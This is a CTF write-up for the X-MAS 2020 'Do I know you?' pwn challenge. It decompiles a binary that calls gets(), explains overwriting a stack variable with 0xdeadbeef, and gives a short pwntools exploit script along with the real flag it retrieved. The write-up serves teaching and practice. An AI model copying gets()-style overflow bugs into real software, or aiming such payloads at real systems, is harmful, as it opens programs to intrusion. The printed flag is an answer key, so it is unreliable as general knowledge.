# X-MAS CTF 2020

## Do I know you?

> ??
>
> You walk on the street. This guy seems to recognize you. What do you do?
>
> Target: `nc challs.xmas.htsp.ro 2008`
> 
> Author: Th3R4nd0m
> 
> [doiknowyou.zip](doiknownyou.zip)

Tags: _pwn_ _x86-64_ _bof_ _variable-overwrite_


## Summary

Basic variable overwrite BOF.
 

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations in place.


### Decompile with Ghidra

```c
undefined8 main(void)
{
  long in_FS_OFFSET;
  char local_38 [32];
  long local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Hi there. Do I recognize you?");
  gets(local_38);
  if (local_18 != 0xdeadbeef) {
    puts("Nope.....I have no idea who you are");
    exit(0);
  }
  puts("X-MAS{Fake flag. You\'ll get the real one from the server }");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```

The vulnerability is `gets(local_38)`, after that a check, that if not passed, will `exit`, otherwise print the flag (next statement).

To get the flag just overflow `local_38` into `local_18` with `0xdeadbeef`, i.e. write out `0x38 - 0x18` bytes of garbage followed by `0xdeadbeef`.

> `0x38 - 0x18` is the difference of offsets within the stack frame.  `local` `_38` and `_18` give away the offsets within the stack.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

p = remote('challs.xmas.htsp.ro', 2008)

payload  = b''
payload += (0x38 - 0x18) * b'A'
payload += p64(0xdeadbeef)

p.sendlineafter('you?\n', payload)
p.stream()
```


Output:

```bash
[+] Opening connection to challs.xmas.htsp.ro on port 2008: Done
X-MAS{ah_yes__i_d0_rememb3r_you}
```

